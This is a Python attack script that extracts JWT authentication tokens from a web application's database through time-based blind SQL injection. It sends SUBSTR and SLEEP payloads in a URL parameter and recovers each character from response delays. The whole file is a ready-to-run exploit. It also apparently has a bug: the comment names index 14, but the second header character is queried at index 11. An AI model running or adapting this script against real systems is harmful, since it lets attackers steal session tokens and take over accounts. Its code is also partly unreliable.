#!/usr/bin/env python3
# Ported from Go to Python3 by @DarkMatterMatt
import requests
import time

TARGET = "http://localhost/?id=2&jwt=$payload$"
# payload must sleep if  JWT_Char < $char$
# regex payload must sleep if it does not match
PAYLOAD = "' OR SUBSTR(jwt, $index$ %2B 1, 1) >= '$char$' OR SLEEP(0.1) OR '"
REGEX_PAYLOAD = "' OR SUBSTR(jwt, $index$ %2B 1, 1) NOT REGEXP BINARY '$regex$' OR SLEEP(0.1) OR '"
SUCCESS_TIME = 0.1

HEADERS = {
    # I+I|M|U
    "IUzI": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.",
    "IUzM": "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.",
    "IUzU": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.",

    # S+I|M|U
    "SUzI": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.",
    "SUzM": "eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.",
    "SUzU": "eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.",

    # F+I|M|U
    "FUzI": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.",
    "FUzM": "eyJhbGciOiJFUzM4NCIsInR5cCI6IkpXVCIsImtpZCI6ImlUcVhYSTB6YkFuSkNLRGFvYmZoa00xZi02ck1TcFRmeVpNUnBfMnRLSTgifQ.",
    "FUzU": "eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6InhaRGZacHJ5NFA5dlpQWnlHMmZOQlJqLTdMejVvbVZkbTd0SG9DZ1NOZlkifQ.",

    # Q+I|M
    "QUzI": "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.",
    "QUzM": "eyJhbGciOiJQUzM4NCIsInR5cCI6IkpXVCJ9.",
}

total_requests = 0

def create_tree(arr):
    # end of branch
    if len(arr) == 1:
        return (arr[0],)

    # find the middle index, and element
    mid = len(arr) // 2
    root = arr[mid]

    # create the tree recursively
    return root, create_tree(arr[:mid]), create_tree(arr[mid:])


def test_payload(payload):
    target = TARGET.replace("$payload$", payload)

    # time query
    start_time = time.time()
    requests.get(target)
    elapsed_time = time.time() - start_time

    global total_requests
    total_requests += 1

    return elapsed_time > SUCCESS_TIME

def test_regex(index, regex):
    payload = REGEX_PAYLOAD.replace("$index$", str(index)).replace("$regex$", regex)
    return test_payload(payload)

def test_char(index, char):
    #print(char)
    payload = PAYLOAD.replace("$index$", str(index)).replace("$char$", char)
    return test_payload(payload)

def query_char(index, tree):
    if len(tree) == 1:
        # maybe double check char here?
        if test_regex(index, "[A-Z]"):
            return tree[0].upper()
        return tree[0].lower()
    
    current_char, lower, higher = tree
    slept = test_char(index, current_char)

    return query_char(index, lower if slept else higher)

def main():
    print("[+] Retriving JWT Tokens.....")
    print("[+] ", end="")

    # get header using characters at index 11 & 14
    # https://medium.com/@fasthm00/jwt-exfiltration-optimization-mysqli-66bc3238a2be
    char11 = query_char(11, create_tree(list("IFQS")))
    char14 = query_char(11, create_tree(list("IMU")))
    header = HEADERS[char11 + "Uz" + char14]
    print(header, end="")

    # this is in order, don't change it
    charset = [""] + list("_-.0123456789abcdefghijklmnopqrstuvwxyz")
    tree = create_tree(charset)

    for i in range(len(header), 1024):
        char = query_char(i, tree)
        if char == "":
            break

        print(char, end="", flush=True)

    print("\n[+] Number of Requests:", total_requests)
    print("[+] Exfiltration Done!")


if __name__ == "__main__":
    main()
